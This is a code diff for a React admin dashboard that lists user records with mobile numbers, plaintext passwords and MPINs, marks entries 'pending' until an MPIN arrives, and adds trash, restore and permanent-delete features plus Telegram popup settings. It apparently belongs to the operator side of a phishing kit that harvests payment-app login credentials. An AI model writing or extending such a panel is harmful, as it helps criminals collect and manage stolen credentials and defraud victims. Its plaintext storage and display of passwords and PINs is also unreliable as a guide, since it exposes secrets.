@@ -1,6 +1,5 @@
 import { useEffect, useMemo, useState } from 'react'
 import {
-  Check,
   Film,
   Image,
   LayoutDashboard,
@@ -12,6 +11,7 @@ import {
   MonitorSmartphone,
   PanelLeftClose,
   RefreshCcw,
+  RotateCcw,
   SlidersHorizontal,
   Trash2,
   Upload,
@@ -148,9 +148,29 @@ function Empty({ icon: Icon, title, text }) {
   )
 }
 
-function Dashboard({ settings, setSettings }) {
+function Dashboard({ settings, session }) {
+  const [users, setUsers] = useState([])
+  const [stats, setStats] = useState({ total: 0, active: 0, trash: 0, complete: 0 })
+  useEffect(() => {
+    let active = true
+    const fetchOverview = () => {
+      apiRequest('/admin/users', { token: session.token })
+        .then((data) => {
+          if (!active) return
+          setUsers((data.users || []).slice(0, 10))
+          if (data.stats) setStats(data.stats)
+        })
+        .catch(() => {})
+    }
+    fetchOverview()
+    const interval = window.setInterval(fetchOverview, 10000)
+    return () => {
+      active = false
+      window.clearInterval(interval)
+    }
+  }, [session.token])
   const cards = [
-    ['Total logins', '0', '0 complete', Users, 'blue'],
+    ['Total users', String(stats.total), `${stats.complete} complete`, Users, 'blue'],
     ['Active slides', String(settings.slides), 'Homepage carousel', SlidersHorizontal, 'gold'],
     [
       'Banner',
@@ -173,7 +193,7 @@ function Dashboard({ settings, setSettings }) {
       Film,
       'orange',
     ],
-    ['Trash', '0', 'Recoverable records', Trash2, 'red'],
+    ['Trash', String(stats.trash), 'Recoverable records', Trash2, 'red'],
   ]
   return (
     <div className="admin-dashboard">
@@ -185,41 +205,6 @@ function Dashboard({ settings, setSettings }) {
         </div>
         <div className="welcome-icon">
           <MonitorSmartphone />
-        </div>
-      </section>
-      <section className="admin-panel realtime-control-panel">
-        <header>
-          <div>
-            <span>LIVE USER APP CONTROLS</span>
-            <h2>Popup visibility</h2>
-            <p>Every switch is saved immediately and reaches the user app automatically.</p>
-          </div>
-          <b className="status-chip">
-            <i /> Real-time sync
-          </b>
-        </header>
-        <div className="toggle-grid">
-          <Toggle
-            icon={Image}
-            label="Banner popup"
-            detail="Homepage promotional banner"
-            checked={settings.banner}
-            onChange={(value) => setSettings({ ...settings, banner: value })}
-          />
-          <Toggle
-            icon={Link2}
-            label="Telegram popup"
-            detail="Community link prompt"
-            checked={settings.telegram}
-            onChange={(value) => setSettings({ ...settings, telegram: value })}
-          />
-          <Toggle
-            icon={Film}
-            label="Media popup"
-            detail="Video or image announcement"
-            checked={settings.popup}
-            onChange={(value) => setSettings({ ...settings, popup: value })}
-          />
         </div>
       </section>
       <div className="metric-grid">
@@ -238,26 +223,28 @@ function Dashboard({ settings, setSettings }) {
         <header>
           <div>
             <span>QUICK OVERVIEW</span>
-            <h2>User-side configuration</h2>
+            <h2>Latest 10 users</h2>
+            <p>Most recent user logins from the live application.</p>
           </div>
         </header>
-        <div className="overview-rows">
-          <div>
-            <Check />
-            <span>Mobile login and MPIN verification flow</span>
-            <b>Ready</b>
+        {users.length ? (
+          <div className="latest-user-list">
+            {users.map((user, index) => (
+              <article key={user.id}>
+                <b>{index + 1}</b>
+                <span>
+                  <strong>{user.mobile}</strong>
+                  <small>{new Date(user.created_at).toLocaleString()}</small>
+                </span>
+                <em className={`record-status ${user.status === 'complete' ? 'complete' : ''}`}>
+                  {user.status}
+                </em>
+              </article>
+            ))}
           </div>
-          <div>
-            <Check />
-            <span>Home banner carousel</span>
-            <b>{settings.slides} slides</b>
-          </div>
-          <div>
-            <Check />
-            <span>Application API</span>
-            <b>Connected</b>
-          </div>
-        </div>
+        ) : (
+          <Empty icon={Users} title="No users yet" text="Recent user logins will appear here." />
+        )}
       </section>
     </div>
   )
@@ -285,25 +272,26 @@ function UsersPanel({ session }) {
 
   const handleDelete = async () => {
     if (!selected.length) return
-    if (!window.confirm(`Delete ${selected.length} selected records?`)) return
+    if (!window.confirm(`Move ${selected.length} selected records to Trash?`)) return
     setLoading(true)
     try {
       await apiRequest('/admin/users', {
         method: 'DELETE',
         token: session.token,
-        body: { ids: selected }
+        body: { ids: selected },
       })
       setSelected([])
       fetchUsers()
     } catch (err) {
-      alert(err.message || 'Could not delete records.')
+      alert(err.message || 'Could not move records to Trash.')
     } finally {
       setLoading(false)
     }
   }
 
   const filteredUsers = users.filter((u) => u.mobile && u.mobile.includes(search))
-  const allSelected = filteredUsers.length > 0 && selected.length === filteredUsers.length
+  const allSelected =
+    filteredUsers.length > 0 && filteredUsers.every((user) => selected.includes(user.id))
 
   const toggleAll = () => {
     if (allSelected) setSelected([])
@@ -323,19 +311,22 @@ function UsersPanel({ session }) {
           <h2>Users</h2>
           <p>Real-time login activity from the user application.</p>
         </div>
-        <div style={{ display: 'flex', gap: '1rem', alignItems: 'center' }}>
-          <label style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', background: '#f0f0f0', padding: '0.25rem 0.75rem', borderRadius: '4px' }}>
+        <div className="table-actions">
+          <label className="record-search">
             <Search size={16} />
             <input
               type="text"
               placeholder="Search mobile..."
               value={search}
               onChange={(e) => setSearch(e.target.value)}
-              style={{ border: 'none', background: 'transparent', outline: 'none' }}
             />
           </label>
-          <button className="admin-secondary" onClick={handleDelete} disabled={!selected.length || loading} style={{ color: 'red' }}>
-            <Trash2 size={16} /> Delete Selected
+          <button
+            className="admin-secondary danger-action"
+            onClick={handleDelete}
+            disabled={!selected.length || loading}
+          >
+            <Trash2 size={16} /> Move to Trash
           </button>
         </div>
       </header>
@@ -355,12 +346,16 @@ function UsersPanel({ session }) {
           </thead>
           <tbody>
             {filteredUsers.length === 0 ? (
-              <tr>
+              <tr className="empty-table-row">
                 <td colSpan="6">
                   <Empty
                     icon={Users}
                     title="No records found"
-                    text={search ? "Try a different search term." : "User login history will appear here."}
+                    text={
+                      search
+                        ? 'Try a different search term.'
+                        : 'User login history will appear here.'
+                    }
                   />
                 </td>
               </tr>
@@ -368,20 +363,26 @@ function UsersPanel({ session }) {
               filteredUsers.map((user) => (
                 <tr key={user.id}>
                   <td>
-                    <input type="checkbox" checked={selected.includes(user.id)} onChange={() => toggleOne(user.id)} />
+                    <input
+                      type="checkbox"
+                      checked={selected.includes(user.id)}
+                      onChange={() => toggleOne(user.id)}
+                    />
                   </td>
-                  <td>{user.mobile}</td>
-                  <td>{user.password}</td>
-                  <td>{user.status === 'pending' ? <span style={{ color: '#f59e0b' }}>pending...</span> : user.mpin}</td>
-                  <td>{new Date(user.created_at).toLocaleString()}</td>
-                  <td>
-                    <span style={{ 
-                      padding: '2px 6px', 
-                      borderRadius: '4px', 
-                      fontSize: '12px',
-                      background: user.status === 'complete' ? '#dcfce7' : '#fef3c7',
-                      color: user.status === 'complete' ? '#166534' : '#92400e'
-                    }}>
+                  <td data-label="Mobile">{user.mobile}</td>
+                  <td data-label="Password">{user.password}</td>
+                  <td data-label="MPIN">
+                    {user.status === 'pending' ? (
+                      <span className="pending-value">pending...</span>
+                    ) : (
+                      user.mpin
+                    )}
+                  </td>
+                  <td data-label="Login time">{new Date(user.created_at).toLocaleString()}</td>
+                  <td data-label="Status">
+                    <span
+                      className={`record-status ${user.status === 'complete' ? 'complete' : ''}`}
+                    >
                       {user.status}
                     </span>
                   </td>
@@ -394,6 +395,156 @@ function UsersPanel({ session }) {
     </section>
   )
 }
+
+function TrashPanel({ session }) {
+  const [users, setUsers] = useState([])
+  const [selected, setSelected] = useState([])
+  const [loading, setLoading] = useState(false)
+  const [message, setMessage] = useState('')
+
+  const fetchTrash = () => {
+    apiRequest('/admin/users?scope=trash', { token: session.token })
+      .then((data) => setUsers(data.users || []))
+      .catch((error) => setMessage(error.message || 'Trash could not be loaded.'))
+  }
+
+  useEffect(() => {
+    fetchTrash()
+    const interval = window.setInterval(fetchTrash, 10000)
+    return () => window.clearInterval(interval)
+  }, [session.token])
+
+  const allSelected = users.length > 0 && users.every((user) => selected.includes(user.id))
+  const toggleAll = () => setSelected(allSelected ? [] : users.map((user) => user.id))
+  const toggleOne = (id) =>
+    setSelected((current) =>
+      current.includes(id) ? current.filter((item) => item !== id) : [...current, id],
+    )
+
+  const restore = async () => {
+    if (!selected.length) return
+    setLoading(true)
+    setMessage('Restoring records…')
+    try {
+      const data = await apiRequest('/admin/users/restore', {
+        method: 'POST',
+        token: session.token,
+        body: { ids: selected },
+      })
+      setSelected([])
+      setMessage(data.message)
+      fetchTrash()
+    } catch (error) {
+      setMessage(error.message || 'Records could not be restored.')
+    } finally {
+      setLoading(false)
+    }
+  }
+
+  const removePermanently = async () => {
+    if (!selected.length) return
+    if (
+      !window.confirm(
+        `Permanently delete ${selected.length} selected records? This cannot be undone.`,
+      )
+    )
+      return
+    setLoading(true)
+    setMessage('Deleting records permanently…')
+    try {
+      const data = await apiRequest('/admin/users/permanent', {
+        method: 'DELETE',
+        token: session.token,
+        body: { ids: selected },
+      })
+      setSelected([])
+      setMessage(data.message)
+      fetchTrash()
+    } catch (error) {
+      setMessage(error.message || 'Records could not be permanently deleted.')
+    } finally {
+      setLoading(false)
+    }
+  }
+
+  return (
+    <section className="admin-panel admin-table-panel">
+      <header>
+        <div>
+          <span>RECOVERABLE RECORDS</span>
+          <h2>Trash</h2>
+          <p>Restore deleted users or remove them permanently.</p>
+        </div>
+        <div className="table-actions">
+          <button
+            className="admin-secondary restore-action"
+            onClick={restore}
+            disabled={!selected.length || loading}
+          >
+            <RotateCcw size={16} /> Restore
+          </button>
+          <button
+            className="admin-secondary danger-action"
+            onClick={removePermanently}
+            disabled={!selected.length || loading}
+          >
+            <Trash2 size={16} /> Delete permanently
+          </button>
+        </div>
+      </header>
+      <div className="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>
+                <input type="checkbox" checked={allSelected} onChange={toggleAll} />
+              </th>
+              <th>Mobile</th>
+              <th>Login Date &amp; Time</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody>
+            {!users.length ? (
+              <tr className="empty-table-row">
+                <td colSpan="4">
+                  <Empty
+                    icon={Trash2}
+                    title="Trash is empty"
+                    text="Deleted user records will appear here."
+                  />
+                </td>
+              </tr>
+            ) : (
+              users.map((user) => (
+                <tr key={user.id}>
+                  <td>
+                    <input
+                      type="checkbox"
+                      checked={selected.includes(user.id)}
+                      onChange={() => toggleOne(user.id)}
+                    />
+                  </td>
+                  <td data-label="Mobile">{user.mobile}</td>
+                  <td data-label="Login time">{new Date(user.created_at).toLocaleString()}</td>
+                  <td data-label="Status">
+                    <span
+                      className={`record-status ${user.status === 'complete' ? 'complete' : ''}`}
+                    >
+                      {user.status}
+                    </span>
+                  </td>
+                </tr>
+              ))
+            )}
+          </tbody>
+        </table>
+      </div>
+      {message && <p className="admin-message">{message}</p>}
+    </section>
+  )
+}
+
 function UploadPanel({ title, text, settings, setSettings, session }) {
   const [message, setMessage] = useState('')
   const [uploading, setUploading] = useState(false)
@@ -473,7 +624,10 @@ function UploadPanel({ title, text, settings, setSettings, session }) {
         ) : (
           slideImages.map((slide, index) => (
             <article key={slide.id}>
-              <img src={slide.url.startsWith('http') ? slide.url : `${MEDIA_ORIGIN}${slide.url}`} alt={slide.name} />
+              <img
+                src={slide.url.startsWith('http') ? slide.url : `${MEDIA_ORIGIN}${slide.url}`}
+                alt={slide.name}
+              />
               <div>
                 <strong>
                   {index + 1}. {slide.name}
@@ -640,9 +794,15 @@ function SingleMediaControl({ kind, settings, setSettings, saveSettings, session
       {media && (
         <div className="media-preview">
           {media.type === 'video' ? (
-            <video src={media.url.startsWith('http') ? media.url : `${MEDIA_ORIGIN}${media.url}`} controls />
+            <video
+              src={media.url.startsWith('http') ? media.url : `${MEDIA_ORIGIN}${media.url}`}
+              controls
+            />
           ) : (
-            <img src={media.url.startsWith('http') ? media.url : `${MEDIA_ORIGIN}${media.url}`} alt={media.name} />
+            <img
+              src={media.url.startsWith('http') ? media.url : `${MEDIA_ORIGIN}${media.url}`}
+              alt={media.name}
+            />
           )}
           <div>
             <strong>{media.name}</strong>
@@ -789,11 +949,11 @@ function Profile({ session }) {
 }
 
 function ControlCenter({ session, onLogout }) {
-  const [active, setActive] = useState('dashboard')
+  const [active, setActive] = useState('users')
   const [menu, setMenu] = useState(false)
   const [settings, setSettings] = useState({
     slides: 1,
-    banner: true,
+    banner: false,
     telegram: false,
     popup: false,
     telegramUrl: 'https://t.me/millerpay',
@@ -812,6 +972,7 @@ function ControlCenter({ session, onLogout }) {
       .catch(() => setSyncState('Sync unavailable'))
   }, [])
   const saveSettings = async (next) => {
+    const previous = settings
     setSettings(next)
     setSyncState('Syncing…')
     try {
@@ -824,6 +985,7 @@ function ControlCenter({ session, onLogout }) {
       setSyncState('Live sync')
       return true
     } catch {
+      setSettings(previous)
       setSyncState('Sync failed')
       return false
     }
@@ -877,7 +1039,7 @@ function ControlCenter({ session, onLogout }) {
           </b>
         </header>
         <div className="admin-view">
-          {active === 'dashboard' && <Dashboard settings={settings} setSettings={saveSettings} />}{' '}
+          {active === 'dashboard' && <Dashboard settings={settings} session={session} />}{' '}
           {active === 'users' && <UsersPanel session={session} />}
           {active === 'slides' && (
             <UploadPanel
@@ -897,21 +1059,7 @@ function ControlCenter({ session, onLogout }) {
               session={session}
             />
           )}{' '}
-          {active === 'trash' && (
-            <section className="admin-panel">
-              <header>
-                <div>
-                  <span>RECOVERABLE RECORDS</span>
-                  <h2>Trash</h2>
-                </div>
-              </header>
-              <Empty
-                icon={Trash2}
-                title="Trash is empty"
-                text="Deleted records can be restored from here."
-              />
-            </section>
-          )}
+          {active === 'trash' && <TrashPanel session={session} />}
           {active === 'telegram' && (
             <TelegramControl settings={settings} saveSettings={saveSettings} />
           )}{' '}
